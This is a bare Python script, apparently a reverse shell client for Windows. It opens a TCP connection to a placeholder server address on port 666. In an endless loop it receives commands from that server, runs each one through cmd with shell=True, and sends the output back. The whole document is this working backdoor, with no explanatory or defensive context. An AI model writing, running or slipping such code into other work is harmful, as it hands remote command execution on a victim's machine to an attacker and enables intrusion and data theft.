import socket
import subprocess

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('<server IP>', 666))

while True:
    server_command = client.recv(99999).decode()
    proc = subprocess.Popen(['cmd', '/k', str(server_command)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    client.send( str(proc.communicate()[0]).encode("utf-8"))

client.close()